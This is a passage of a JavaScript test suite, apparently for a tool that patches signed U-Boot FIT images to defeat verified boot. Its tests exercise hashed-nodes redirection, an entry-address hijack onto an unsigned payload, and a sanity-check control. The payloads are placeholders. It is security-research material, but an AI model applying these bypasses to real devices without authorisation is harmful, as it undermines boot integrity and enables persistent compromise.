    const total = payloadSize + certSz + 4; // +4 for trailing size field
    const buf = new Uint8Array(total);
    // Fill payload with non-zero data
    for (let i = 0; i < payloadSize; i++) buf[i] = 0xAA;
    // SDM_CERT_MAGIC_NUM 0x25D04E7F in little-endian
    const dv = new DataView(buf.buffer);
    dv.setUint32(payloadSize, 0x25D04E7F, true);
    // Write cert size at the end (little-endian)
    dv.setUint32(total - 4, certSz, true);
    return buf;
  }

  it('image with VAB certificate appended is flagged as VAB', async () => {
    const vabData = buildVABImage(128);

    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'vab-firmware',
      properties: [
        { name: 'description', data: enc.encode('VAB signed firmware\0') },
        { name: 'data', data: vabData },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    const firmware = result.images.find(i => i.name === 'vab-firmware');
    assert.ok(firmware, 'Expected vab-firmware image');
    assert.equal(firmware.isVAB, true, 'Should be flagged as VAB');
  });

  it('normal kernel image is not flagged as VAB', async () => {
    const { binary } = await buildTestFit();
    const result = FitOps.validate(binary);
    const kernel = result.images.find(i => i.name === 'kernel');
    assert.ok(kernel);
    assert.equal(kernel.isVAB, false, 'kernel should not be flagged as VAB');
  });

  it('image too small for VAB is not flagged', async () => {
    const tiny = new Uint8Array(4);

    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'tiny-img',
      properties: [
        { name: 'description', data: enc.encode('Tiny\0') },
        { name: 'data', data: tiny },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    const img = result.images.find(i => i.name === 'tiny-img');
    assert.ok(img);
    assert.equal(img.isVAB, false, 'Tiny image should not be flagged as VAB');
  });

  it('image with wrong magic is not flagged as VAB', async () => {
    // Build something that looks like VAB but with wrong magic
    const total = 128 + 64 + 4;
    const buf = new Uint8Array(total);
    const dv = new DataView(buf.buffer);
    dv.setUint32(128, 0xDEADBEEF, true); // wrong magic
    dv.setUint32(total - 4, 64, true); // cert size

    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'not-vab',
      properties: [
        { name: 'description', data: enc.encode('Not VAB\0') },
        { name: 'data', data: buf },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    const img = result.images.find(i => i.name === 'not-vab');
    assert.ok(img);
    assert.equal(img.isVAB, false, 'Wrong magic should not be flagged as VAB');
  });
});

// ---------------------------------------------------------------------------
// Multi-configuration coverage
// ---------------------------------------------------------------------------
describe('Multi-configuration coverage', () => {
  it('changeDtModel modifies all flat_dt images, not just the first', async () => {
    const binary = await buildMultiConfigFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);

    for (const fdtName of ['fdt-1', 'fdt-2']) {
      const fdtImg = FDT.findNode(tree.root, ['images', fdtName]);
      assert.ok(fdtImg, `Expected /images/${fdtName}`);
      const dtData = FDT.getProperty(fdtImg, 'data');
      const innerTree = FDT.parse(dtData);
      const model = FDT.getStringProperty(innerTree.root, 'model');
      assert.ok(model.includes('[rooted by fitfall.de]'),
        `${fdtName} /model should be modified, got: ${model}`);
    }
  });

  it('changeDtModel creates orig containers for all fdt images', async () => {
    const binary = await buildMultiConfigFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);
    const images = FDT.findNode(tree.root, ['images']);

    for (const fdtName of ['fdt-1', 'fdt-2']) {
      const container = images.children.find(c => c.name === `orig-${fdtName}`);
      assert.ok(container, `Expected /images/orig-${fdtName} container`);
      const clone = container.children.find(c => c.name === fdtName);
      assert.ok(clone, `Expected /images/orig-${fdtName}/${fdtName} clone`);
    }
  });

  it('changeDtModel redirects signatures in all configurations', async () => {
    const binary = await buildMultiConfigFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);

    // conf-1 signature should reference orig-fdt-1
    const sig1 = FDT.findNode(tree.root, ['configurations', 'conf-1', 'signature-1']);
    const hn1 = new TextDecoder().decode(FDT.getProperty(sig1, 'hashed-nodes'));
    assert.ok(hn1.includes('/images/orig-fdt-1/fdt-1'),
      `conf-1 hashed-nodes should reference orig-fdt-1, got: ${hn1}`);

    // conf-2 signature should reference orig-fdt-2
    const sig2 = FDT.findNode(tree.root, ['configurations', 'conf-2', 'signature-1']);
    const hn2 = new TextDecoder().decode(FDT.getProperty(sig2, 'hashed-nodes'));
    assert.ok(hn2.includes('/images/orig-fdt-2/fdt-2'),
      `conf-2 hashed-nodes should reference orig-fdt-2, got: ${hn2}`);
  });

  it('changeDtModel preserves original /model in each orig container', async () => {
    const binary = await buildMultiConfigFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);

    const origFdt1 = FDT.findNode(tree.root, ['images', 'orig-fdt-1', 'fdt-1']);
    const orig1Data = FDT.getProperty(origFdt1, 'data');
    const orig1Model = FDT.getStringProperty(FDT.parse(orig1Data).root, 'model');
    assert.equal(orig1Model, 'Board A', 'orig-fdt-1 should preserve Board A');

    const origFdt2 = FDT.findNode(tree.root, ['images', 'orig-fdt-2', 'fdt-2']);
    const orig2Data = FDT.getProperty(origFdt2, 'data');
    const orig2Model = FDT.getStringProperty(FDT.parse(orig2Data).root, 'model');
    assert.equal(orig2Model, 'Board B', 'orig-fdt-2 should preserve Board B');
  });
});

// ---------------------------------------------------------------------------
// Loadables (stringlist) support
// ---------------------------------------------------------------------------
describe('Loadables stringlist support', () => {
  it('validate parses loadables stringlist into separate imageRefs', async () => {
    const enc = new TextEncoder();
    function strProp(s) { return enc.encode(s + '\0'); }
    function strListProp(...ss) { return enc.encode(ss.map(s => s + '\0').join('')); }
    function u32Prop(v) {
      const b = new ArrayBuffer(4);
      new DataView(b).setUint32(0, v);
      return new Uint8Array(b);
    }

    const kernel = enc.encode('kernel data');
    const atf = enc.encode('atf data');
    const tee = enc.encode('tee data');

    const tree = {
      header: { version: 17, last_comp_version: 16, boot_cpuid_phys: 0 },
      reserveEntries: [],
      root: {
        name: '',
        properties: [
          { name: 'description', data: strProp('FIT with loadables') },
          { name: '#address-cells', data: u32Prop(1) },
        ],
        children: [
          {
            name: 'images',
            properties: [],
            children: [
              {
                name: 'kernel',
                properties: [
                  { name: 'description', data: strProp('Linux Kernel') },
                  { name: 'data', data: new Uint8Array(kernel) },
                  { name: 'type', data: strProp('kernel') },
                  { name: 'compression', data: strProp('none') },
                ],
                children: [],
              },
              {
                name: 'atf',
                properties: [
                  { name: 'description', data: strProp('ARM Trusted Firmware') },
                  { name: 'data', data: new Uint8Array(atf) },
                  { name: 'type', data: strProp('firmware') },
                  { name: 'compression', data: strProp('none') },
                ],
                children: [],
              },
              {
                name: 'tee',
                properties: [
                  { name: 'description', data: strProp('OP-TEE') },
                  { name: 'data', data: new Uint8Array(tee) },
                  { name: 'type', data: strProp('tee') },
                  { name: 'compression', data: strProp('none') },
                ],
                children: [],
              },
            ],
          },
          {
            name: 'configurations',
            properties: [{ name: 'default', data: strProp('conf-1') }],
            children: [
              {
                name: 'conf-1',
                properties: [
                  { name: 'description', data: strProp('Boot config with loadables') },
                  { name: 'kernel', data: strProp('kernel') },
                  { name: 'loadables', data: strListProp('atf', 'tee') },
                ],
                children: [],
              },
            ],
          },
        ],
      },
    };

    const binary = FDT.serialize(tree);
    const result = FitOps.validate(binary);

    assert.ok(result.valid);
    assert.equal(result.configs.length, 1);

    const cfg = result.configs[0];
    const loadableRefs = cfg.imageRefs.filter(r => r.role === 'loadables');
    assert.equal(loadableRefs.length, 2, 'Should have 2 loadable refs');
    assert.equal(loadableRefs[0].image, 'atf');
    assert.equal(loadableRefs[1].image, 'tee');

    // Kernel should still be there too
    const kernelRef = cfg.imageRefs.find(r => r.role === 'kernel');
    assert.ok(kernelRef, 'Should have kernel ref');
    assert.equal(kernelRef.image, 'kernel');
  });
});

// ---------------------------------------------------------------------------
// ShaFallback — verify identical output to crypto.subtle
// ---------------------------------------------------------------------------
describe('ShaFallback', () => {
  const testVectors = [
    new Uint8Array(0),                                    // empty
    new Uint8Array([0x61, 0x62, 0x63]),                   // "abc"
    new TextEncoder().encode('hello world'),               // short string
    new Uint8Array(55),                                    // exactly one block after padding
    new Uint8Array(56),                                    // triggers two-block padding
    new Uint8Array(64),                                    // exactly one block
    new Uint8Array(1000).map((_, i) => i & 0xFF),         // multi-block
    new Uint8Array(65536).map((_, i) => (i * 31) & 0xFF), // large input
  ];

  for (const [i, input] of testVectors.entries()) {
    it(`sha256 matches crypto.subtle for vector ${i} (${input.length} bytes)`, async () => {
      const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', input));
      const actual = new Uint8Array(await ShaFallback.sha256(input));
      assert.deepEqual(actual, expected);
    });

    it(`sha1 matches crypto.subtle for vector ${i} (${input.length} bytes)`, async () => {
      const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-1', input));
      const actual = new Uint8Array(await ShaFallback.sha1(input));
      assert.deepEqual(actual, expected);
    });
  }

  it('sha256 accepts ArrayBuffer input', async () => {
    const data = new Uint8Array([1, 2, 3, 4]).buffer;
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', data));
    const actual = new Uint8Array(await ShaFallback.sha256(data));
    assert.deepEqual(actual, expected);
  });

  it('sha1 accepts ArrayBuffer input', async () => {
    const data = new Uint8Array([1, 2, 3, 4]).buffer;
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-1', data));
    const actual = new Uint8Array(await ShaFallback.sha1(data));
    assert.deepEqual(actual, expected);
  });

  it('sha256 returns ArrayBuffer', async () => {
    const result = await ShaFallback.sha256(new Uint8Array([0]));
    assert.ok(result instanceof ArrayBuffer);
    assert.equal(result.byteLength, 32);
  });

  it('sha1 returns ArrayBuffer', async () => {
    const result = await ShaFallback.sha1(new Uint8Array([0]));
    assert.ok(result instanceof ArrayBuffer);
    assert.equal(result.byteLength, 20);
  });
});

// ---------------------------------------------------------------------------
// Sanity-check method
//
// The negative control: patch the signed image, recompute its hashes and leave
// the configuration signature alone.  The result must fail verification, so a
// device that boots it is not verifying signatures at all and a pass from the
// real bypass proves nothing there.
// ---------------------------------------------------------------------------
describe('Sanity-check method', () => {
  let fitBinary;

  const SANITY_OPTS = {
    changeDtModel: false,
    replaceKernel: true,
    method: 'sanity-check',
  };

  before(async () => {
    fitBinary = (await buildTestFit()).binary;
  });

  async function patchKernel(payloadText) {
    const kernelData = new TextEncoder().encode(payloadText);
    const out = await FitOps.root(fitBinary, { ...SANITY_OPTS, kernelData });
    return { out, tree: FDT.parse(out), kernelData };
  }

  it('offers the methods in drop-down order, default first', () => {
    assert.deepEqual(FitOps.METHODS, ['hashed-nodes', 'entry-address', 'sanity-check']);
  });

  it('rejects an unknown method', async () => {
    await assert.rejects(
      () => FitOps.root(fitBinary, { ...SANITY_OPTS, method: 'nonesuch', kernelData: new Uint8Array(4) }),
      /Unknown bypass method 'nonesuch'/);
  });

  it('patches the signed node in place, without a container', async () => {
    const { tree, kernelData } = await patchKernel('sanity payload');
    const names = FDT.findNode(tree.root, ['images']).children.map(c => c.name);

    assert.deepEqual(names, ['kernel', 'fdt-1'], `Unexpected images: ${names}`);
    assert.deepEqual(FDT.getProperty(FDT.findNode(tree.root, ['images', 'kernel']), 'data'), kernelData);
  });

  it('recomputes the hash of the patched node', async () => {
    const { tree, kernelData } = await patchKernel('hash me too');
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', kernelData));

    const hash = FDT.findNode(tree.root, ['images', 'kernel', 'hash-1']);
    assert.deepEqual(FDT.getProperty(hash, 'value'), expected);
  });

  it('leaves the signature covering the node it always covered', async () => {
    const { tree } = await patchKernel('still signed');
    const origTree = FDT.parse(fitBinary);

    const sig = FDT.findNode(tree.root, ['configurations', 'conf-1', 'signature-1']);
    const origSig = FDT.findNode(origTree.root, ['configurations', 'conf-1', 'signature-1']);
    // signer-name is rewritten on purpose -- nothing in a signature node is
    // hashed -- but every property the verifier reads must be identical.
    for (const name of ['algo', 'key-name-hint', 'sign-images', 'hashed-nodes']) {
      assert.deepEqual(FDT.getProperty(sig, name), FDT.getProperty(origSig, name), name);
    }

    const hashedNodes = new TextDecoder().decode(FDT.getProperty(sig, 'hashed-nodes'));
    assert.ok(hashedNodes.includes('/images/kernel'), `Expected the signed path, got: ${hashedNodes}`);
    assert.ok(!hashedNodes.includes('/images/orig-'), `Nothing should be redirected: ${hashedNodes}`);
  });

  it('marks the patched node (Pwnd)', async () => {
    const { tree } = await patchKernel('described');
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    assert.equal(FDT.getStringProperty(kernel, 'description'), 'Linux Kernel (Pwnd)');
  });

  it('changes the DT model in the signed fdt image itself', async () => {
    const out = await FitOps.root(fitBinary, { changeDtModel: true, method: 'sanity-check' });
    const tree = FDT.parse(out);

    const names = FDT.findNode(tree.root, ['images']).children.map(c => c.name);
    assert.ok(!names.some(n => n.startsWith('orig-')), `Unexpected container in: ${names}`);

    const inner = FDT.parse(FDT.getProperty(FDT.findNode(tree.root, ['images', 'fdt-1']), 'data'));
    assert.ok(FDT.getStringProperty(inner.root, 'model').includes('[rooted by fitfall.de]'));
  });

  it('an explicit hashed-nodes method still uses the orig- container', async () => {
    const out = await FitOps.root(fitBinary, {
      changeDtModel: false,
      replaceKernel: true,
      kernelData: new TextEncoder().encode('classic'),
      method: 'hashed-nodes',
    });
    const names = FDT.findNode(FDT.parse(out).root, ['images']).children.map(c => c.name);
    assert.ok(names.includes('orig-kernel'), `Expected orig-kernel in: ${names}`);
  });
});

// ---------------------------------------------------------------------------
// Entry-address bypass
//
// A per-image signature covers the image's data and nothing else, so load,
// entry and any property we bring along ride into the bootloader unverified.
// See https://lore.kernel.org/u-boot/87h5quqqln.fsf@prevas.dk/
// ---------------------------------------------------------------------------
describe('Entry-address bypass', () => {
  const BASE = 0x82000000;
  const PAYLOAD = new TextEncoder().encode('\x7fthis is shellcode, honest\x00');

  let imageSigned;   // signed the required = "image" way

  before(async () => {
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);

    // Drop the configuration signature and sign the kernel image instead, the
    // way mkimage does it for required = "image": a signature node next to the
    // hash, covering the image data.
    FDT.removeChild(FDT.findNode(tree.root, ['configurations', 'conf-1']), 'signature-1');
    FDT.findNode(tree.root, ['images', 'kernel']).children.push({
      name: 'signature-1',
      properties: [
        { name: 'algo', data: new TextEncoder().encode('sha256,rsa2048\0') },
        { name: 'key-name-hint', data: new TextEncoder().encode('dev\0') },
        { name: 'value', data: new Uint8Array(256).fill(0x5a) },
      ],
      children: [],
    });
    imageSigned = FDT.serialize(tree);
  });

  const hijack = (binary, extra) => FitOps.root(binary, {
    changeDtModel: false,
    replaceKernel: true,
    kernelData: PAYLOAD,
    method: 'entry-address',
    fitLoadAddress: BASE,
    ...extra,
  });

  const kernelOf = binary => FDT.findNode(FDT.parse(binary).root, ['images', 'kernel']);

  it('points entry at the payload as it sits in the loaded blob', async () => {
    const out = await hijack(imageSigned);
    const entry = FitOps.validate(out).images.find(i => i.name === 'kernel').entry;

    const offset = entry - BASE;
    assert.ok(offset > 0 && offset < out.byteLength, `entry 0x${entry.toString(16)} is not inside the FIT`);
    assert.deepEqual(out.slice(offset, offset + PAYLOAD.byteLength), PAYLOAD);
  });

  it('leaves every signed byte of the image alone', async () => {
    const out = await hijack(imageSigned);
    const before = kernelOf(imageSigned);
    const after = kernelOf(out);

    assert.deepEqual(FDT.getProperty(after, 'data'), FDT.getProperty(before, 'data'));
    assert.deepEqual(FDT.getProperty(after, 'load'), FDT.getProperty(before, 'load'));
    assert.deepEqual(FDT.getStringProperty(after, 'description'), 'Linux Kernel');
    for (const name of ['hash-1', 'signature-1']) {
      assert.deepEqual(FDT.findNode(after, [name]), FDT.findNode(before, [name]), name);
    }
  });

  it('carries the payload in a property of the signed node', async () => {
    const out = await hijack(imageSigned);
    assert.deepEqual(FDT.getProperty(kernelOf(out), FitOps.PAYLOAD_PROP), PAYLOAD);
  });

  it('leaves os alone where entry is honoured as it stands', async () => {
    const out = await hijack(imageSigned);
    assert.equal(FDT.getStringProperty(kernelOf(out), 'arch'), 'arm');
    assert.equal(FDT.getStringProperty(kernelOf(out), 'os'), 'linux');
  });

  it('claims vxworks on arm64, where bootm would overwrite the entry', async () => {
    // bootm_load_os() replaces images->ep with the address it relocated the
    // verified kernel to, but only for an arm64 Linux image.  os is no more
    // signed than entry is, so the image stops claiming Linux.
    const tree = FDT.parse(imageSigned);
    FDT.setProperty(FDT.findNode(tree.root, ['images', 'kernel']), 'arch', 'arm64');

    const out = await hijack(FDT.serialize(tree));
    assert.equal(FDT.getStringProperty(kernelOf(out), 'os'), FitOps.ENTRY_OS_ARM64);
    assert.equal(FDT.getStringProperty(kernelOf(out), 'arch'), 'arm64');

    // and the entry still lands on the payload, os being a byte longer
    const entry = FitOps.validate(out).images.find(i => i.name === 'kernel').entry;
    assert.deepEqual(out.slice(entry - BASE, entry - BASE + PAYLOAD.byteLength), PAYLOAD);
  });

  it('flags the entry as pointing outside its image', async () => {
    assert.equal(FitOps.validate(imageSigned).images.find(i => i.name === 'kernel').entryEscapes, false);
    const out = await hijack(imageSigned);
    assert.equal(FitOps.validate(out).images.find(i => i.name === 'kernel').entryEscapes, true);
  });

  it('re-places the entry when run a second time', async () => {
    const once = await hijack(imageSigned);
    const twice = await hijack(once);

    const entry = FitOps.validate(twice).images.find(i => i.name === 'kernel').entry;
    assert.deepEqual(twice.slice(entry - BASE, entry - BASE + PAYLOAD.byteLength), PAYLOAD);
  });

  it('writes a two-cell entry when the image uses two', async () => {
    const tree = FDT.parse(imageSigned);
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    for (const name of ['load', 'entry']) {
      const wide = new Uint8Array(8);
      wide.set(FDT.getProperty(kernel, name), 4);
      FDT.setProperty(kernel, name, wide);
    }

    const out = await hijack(FDT.serialize(tree), { fitLoadAddress: '0x880000000' });
    const entry = FDT.getProperty(kernelOf(out), 'entry');
    assert.equal(entry.byteLength, 8);

    const offset = FitOps.validate(out).images.find(i => i.name === 'kernel').entry - 0x880000000;
    assert.deepEqual(out.slice(offset, offset + PAYLOAD.byteLength), PAYLOAD);
  });

  it('refuses an image a configuration signature covers', async () => {
    const { binary } = await buildTestFit();
    await assert.rejects(hijack(binary), /covered by a configuration signature/);
  });

  it('refuses it on the configuration reference alone, without hashed-nodes', async () => {
    // U-Boot stopped reading hashed-nodes in 2092322b31cc and rebuilds the
    // signed node list from the configuration's image references, so a FIT
    // without the property is no less protected.
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const sig = FDT.findNode(tree.root, ['configurations', 'conf-1', 'signature-1']);
    sig.properties = sig.properties.filter(p => p.name !== 'hashed-nodes');

    await assert.rejects(hijack(FDT.serialize(tree)), /covered by a configuration signature/);
  });

  it('allows an image no signed configuration refers to', async () => {
    // Same FIT, but the configuration names a different kernel: nothing signed
    // covers /images/kernel any more.
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    FDT.setProperty(FDT.findNode(tree.root, ['configurations', 'conf-1']), 'kernel', 'other');
    const sig = FDT.findNode(tree.root, ['configurations', 'conf-1', 'signature-1']);
    sig.properties = sig.properties.filter(p => p.name !== 'hashed-nodes');

    const out = await hijack(FDT.serialize(tree));
    assert.deepEqual(FDT.getProperty(kernelOf(out), FitOps.PAYLOAD_PROP), PAYLOAD);
  });

  // A kernel_noload image is booted where it lies: bootm replaces its load
  // address with the position of the image data and adds that to entry
  // (boot/bootm.c: images.ep += images.os.image_start).  An absolute address
  // in entry therefore lands image_start too far along -- which is what an
  // arm64 Image, the common kernel_noload case, would have done.
  describe('kernel_noload', () => {
    let noload;

    before(() => {
      const tree = FDT.parse(imageSigned);
      FDT.setProperty(FDT.findNode(tree.root, ['images', 'kernel']), 'type', 'kernel_noload');
      noload = FDT.serialize(tree);
    });

    const offsetsOf = binary => ({
      payload: FDT.propertyOffset(binary, ['images', 'kernel'], FitOps.PAYLOAD_PROP),
      data: FDT.propertyOffset(binary, ['images', 'kernel'], 'data'),
    });

    it('writes the entry as an offset from the image data', async () => {
      const out = await hijack(noload);
      const { payload, data } = offsetsOf(out);
      const entry = FitOps.validate(out).images.find(i => i.name === 'kernel').entry;

      assert.equal(entry, payload - data);
      // What bootm computes from it has to land on the payload
      assert.deepEqual(out.slice(data + entry, data + entry + PAYLOAD.byteLength), PAYLOAD);
    });

    it('needs no FIT load address', async () => {
      const out = await hijack(noload, { fitLoadAddress: undefined });
      const { payload, data } = offsetsOf(out);
      assert.equal(FitOps.validate(out).images.find(i => i.name === 'kernel').entry,
        payload - data);
    });

    it('is not flagged as an entry outside its image', async () => {
      const out = await hijack(noload);
      assert.equal(FitOps.validate(out).images.find(i => i.name === 'kernel').entryEscapes,
        false);
    });

    it('still needs the address when a plain kernel is along for the ride', async () => {
      const tree = FDT.parse(noload);
      const images = FDT.findNode(tree.root, ['images']);
      const second = FDT.cloneNode(FDT.findNode(images, ['kernel']));
      second.name = 'kernel-2';
      FDT.setProperty(second, 'type', 'kernel');
      images.children.push(second);

      await assert.rejects(
        hijack(FDT.serialize(tree), { fitLoadAddress: undefined }),
        /needs the address the FIT itself is loaded at/);
    });
  });

  it('refuses the operations that would rewrite signed data', async () => {
    await assert.rejects(hijack(imageSigned, { changeDtModel: true }),
      /cannot change the DT model or append an initramfs/);
    await assert.rejects(
      hijack(imageSigned, { appendInitramfs: true, initramfsData: PAYLOAD }),
      /cannot change the DT model or append an initramfs/);
  });

  it('needs a payload and an address', async () => {
    await assert.rejects(hijack(imageSigned, { replaceKernel: false }), /needs a payload/);
    await assert.rejects(hijack(imageSigned, { fitLoadAddress: undefined }),
      /needs the address the FIT itself is loaded at/);
    await assert.rejects(hijack(imageSigned, { fitLoadAddress: '  ' }),
      /needs the address the FIT itself is loaded at/);
    await assert.rejects(hijack(imageSigned, { fitLoadAddress: 'over there' }),
      /needs the address the FIT itself is loaded at/);
  });
});

// ---------------------------------------------------------------------------
// FDT.propertyOffset
// ---------------------------------------------------------------------------
describe('FDT.propertyOffset', () => {
  let fitBinary;

  before(async () => {
    fitBinary = (await buildTestFit()).binary;
  });

  it('points at the property value inside the blob', () => {
    const offset = FDT.propertyOffset(fitBinary, ['images', 'kernel'], 'data');
    const data = FDT.getProperty(FDT.findNode(FDT.parse(fitBinary).root, ['images', 'kernel']), 'data');
    assert.deepEqual(fitBinary.slice(offset, offset + data.byteLength), data);
  });

  it('tells nodes of the same name at different depths apart', () => {
    const tree = FDT.parse(fitBinary);
    // A second 'kernel' node, one level deeper, whose data must not be found
    // when /images/kernel is what was asked for.
    FDT.findNode(tree.root, ['images', 'kernel']).children.push({
      name: 'kernel',
      properties: [{ name: 'data', data: new TextEncoder().encode('decoy') }],
      children: [],
    });
    const binary = FDT.serialize(tree);

    const outer = FDT.propertyOffset(binary, ['images', 'kernel'], 'data');
    const inner = FDT.propertyOffset(binary, ['images', 'kernel', 'kernel'], 'data');
    assert.notEqual(outer, inner);
    assert.deepEqual(binary.slice(inner, inner + 5), new TextEncoder().encode('decoy'));
  });

  it('returns null for what is not there', () => {
    assert.equal(FDT.propertyOffset(fitBinary, ['images', 'kernel'], 'nonesuch'), null);
    assert.equal(FDT.propertyOffset(fitBinary, ['images', 'nonesuch'], 'data'), null);
  });
});

// ---------------------------------------------------------------------------
// signer-name marker
//
// Everything inside a signature node reaches fit_digest() with want == 1, so
// none of it is hashed.  signer-name can therefore record the manipulation,
// funded by the informational properties next to it.  (The FIT root cannot:
// hashed-nodes starts with "/".)
// ---------------------------------------------------------------------------
describe('signer-name marker', () => {
  let fitBinary;

  before(async () => {
    fitBinary = (await buildTestFit()).binary;
  });

  const PATCH = {
    changeDtModel: false,
    replaceKernel: true,
    kernelData: new TextEncoder().encode('payload'),
  };
  // The default method redirects hashed-nodes, which resizes the signature
  // node on its own; sanity-check leaves the node to us alone.
  const PATCH_ONLY = { ...PATCH, method: 'sanity-check' };

  const sigNode = binary =>
    FDT.findNode(FDT.parse(binary).root, ['configurations', 'conf-1', 'signature-1']);
  const nodeCost = node =>
    node.properties.reduce((n, p) => n + 12 + FDT.align4(p.data.byteLength), 0);
  const names = node => node.properties.map(p => p.name);

  // Rebuild the fixture with the signature node's filler properties adjusted.
  function withFiller(mutate) {
    const tree = FDT.parse(fitBinary);
    mutate(FDT.findNode(tree.root, ['configurations', 'conf-1', 'signature-1']));
    return FDT.serialize(tree);
  }

  it('records the manipulation in signer-name', async () => {
    const out = await FitOps.root(fitBinary, PATCH);
    assert.equal(FDT.getStringProperty(sigNode(out), 'signer-name'),
      'mkimage (fitfall.de)');
  });

  it('uses the long marker when signer-name already has room', async () => {
    const roomy = withFiller(sig => {
      const padded = new Uint8Array(48);
      padded.set(new TextEncoder().encode('mkimage'));
      FDT.setProperty(sig, 'signer-name', padded);
    });
    const out = await FitOps.root(roomy, PATCH_ONLY);
    assert.equal(FDT.getStringProperty(sigNode(out), 'signer-name'),
      'mkimage (manipulated by fitfall.de)');
    // It fit in the property's own padding, so no filler was sacrificed.
    for (const n of ['timestamp', 'signer-version']) {
      assert.ok(names(sigNode(out)).includes(n), `${n} must survive`);
    }
    assert.equal(nodeCost(sigNode(out)), nodeCost(sigNode(roomy)));
  });

  it('pays for it from the informational properties, cheapest first', async () => {
    const out = await FitOps.root(fitBinary, PATCH);
    // The short marker is covered by the timestamp alone, so that is all it takes.
    assert.ok(!names(sigNode(out)).includes('timestamp'), 'timestamp funds the marker');
    assert.ok(names(sigNode(out)).includes('signer-version'),
      'signer-version must not be dropped for nothing');
    // Everything the verifier reads stays
    for (const n of ['algo', 'key-name-hint', 'sign-images', 'hashed-nodes']) {
      assert.ok(names(sigNode(out)).includes(n), `${n} must survive`);
    }
  });

  it('leaves the signature node exactly as large as it was', async () => {
    const out = await FitOps.root(fitBinary, PATCH_ONLY);
    assert.equal(nodeCost(sigNode(out)), nodeCost(sigNode(fitBinary)));
  });

  it('does not mark an already marked FIT twice', async () => {
    const once = await FitOps.root(fitBinary, PATCH);
    const twice = await FitOps.root(once, PATCH);
    assert.equal(FDT.getStringProperty(sigNode(twice), 'signer-name'),
      'mkimage (fitfall.de)');
  });

  it('falls back to the short marker when the budget is tight', async () => {
    const tight = withFiller(sig => {
      FDT.setProperty(sig, 'signer-version', new Uint8Array([0]));
    });
    const out = await FitOps.root(tight, PATCH_ONLY);
    assert.equal(FDT.getStringProperty(sigNode(out), 'signer-name'),
      'mkimage (fitfall.de)');
    assert.equal(nodeCost(sigNode(out)), nodeCost(sigNode(tight)));
  });

  it('leaves the node alone when even the short marker does not fit', async () => {
    const broke = withFiller(sig => {
      sig.properties = sig.properties.filter(
        p => !['timestamp', 'signer-version'].includes(p.name));
    });
    const out = await FitOps.root(broke, PATCH_ONLY);
    assert.equal(FDT.getStringProperty(sigNode(out), 'signer-name'), 'mkimage');
    assert.equal(nodeCost(sigNode(out)), nodeCost(sigNode(broke)));
  });

  it('ignores a signature node without signer-name', async () => {
    const nameless = withFiller(sig => {
      sig.properties = sig.properties.filter(p => p.name !== 'signer-name');
    });
    const out = await FitOps.root(nameless, PATCH);
    assert.equal(FDT.getProperty(sigNode(out), 'signer-name'), null);
    assert.ok(names(sigNode(out)).includes('timestamp'), 'filler must not be eaten for nothing');
  });

  it('leaves the FIT root untouched', async () => {
    const out = await FitOps.root(fitBinary, PATCH);
    const before = FDT.parse(fitBinary).root.properties;
    const after = FDT.parse(out).root.properties;
    assert.deepEqual(after.map(p => p.name), before.map(p => p.name));
    for (const p of before) {
      assert.deepEqual(FDT.getProperty(FDT.parse(out).root, p.name), p.data, p.name);
    }
  });
});

// ---------------------------------------------------------------------------
// Trailing padding
//
// mkimage leaves slack behind the string block (dtc -p).  Reproducing it keeps
// the blob from shrinking, so a FIT spliced back into a disk image lands on its
// original size and the data behind it does not move.
// ---------------------------------------------------------------------------
describe('Trailing padding', () => {
  let fitBinary;

  before(async () => {
    fitBinary = (await buildTestFit()).binary;
  });

  // Append recognisable slack and grow totalsize to cover it, as dtc -p does.
  function withPadding(binary, pad) {
    const out = new Uint8Array(binary.byteLength + pad);
    out.set(binary);
    out.fill(0xa5, binary.byteLength);
    new DataView(out.buffer).setUint32(4, out.byteLength);
    return out;
  }

  // Everything behind the string block.
  function tailOf(binary) {
    const dv = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
    return binary.slice(dv.getUint32(12) + dv.getUint32(32));
  }

  const sizeOf = binary =>
    new DataView(binary.buffer, binary.byteOffset, binary.byteLength).getUint32(4);

  it('replays the padding on a plain round-trip', () => {
    const padded = withPadding(fitBinary, 32);
    const out = FDT.serialize(FDT.parse(padded));

    assert.equal(out.byteLength, padded.byteLength);
    assert.equal(sizeOf(out), out.byteLength, 'totalsize must cover the padding');
    assert.deepEqual(tailOf(out), new Uint8Array(32).fill(0xa5));
  });

  it('keeps the size when the operation fits in the padding', async () => {
    const padded = withPadding(fitBinary, 64);
    const out = await FitOps.root(padded, {
      changeDtModel: false,
      replaceKernel: true,
